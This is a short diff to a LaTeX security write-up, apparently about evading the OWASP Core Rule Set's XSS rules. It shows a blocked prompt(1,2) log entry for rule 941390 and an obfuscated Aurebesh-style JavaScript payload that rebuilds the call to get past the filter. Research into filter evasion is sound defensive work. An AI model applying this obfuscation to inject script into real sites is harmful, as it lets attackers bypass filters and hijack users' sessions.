@@ -30,3 +30,21 @@ After substituting the function call using \verb|('XSS')| with a Tagged Template
 \end{lstlisting}
 
 
+\subsection{Aurebesh.js}
+
+Bypass with prompt
+
+\begin{lstlisting}[style=ruleStyle, language=XML, caption=prompt(1\,2) blocked, label=lst:promptblocked]
+<payload>prompt(1,2)</payload>
+<file>"rules/REQUEST-941-APPLICATION-ATTACK-XSS.conf"</file>
+<fileDetails>[line "714"] [id "941390"]<fileDetails>
+<MatchedData>"prompt("</MatchedData>
+\end{lstlisting}
+
+\begin{lstlisting}[style=ruleStyle, language=XML, caption=aurebesh prompt bypass, label=lst:aurebeshpromptbypass]
+<payload>prompt(1,2)</payload>
+<bypass>A='',B=!A+A,C=!B+A,D=A+{},E=B[A++],F=B[G=A],H=++G+A,I=D[G+H],B[I+=D[A]+(B.C+D)[A]+C[H]+E+F+B[G]+I+E+D[A]+F][I]('p'+F+D[A]+'m'+'p'+E+'(A,++A)')()</bypass>
+\end{lstlisting}
+
+
+
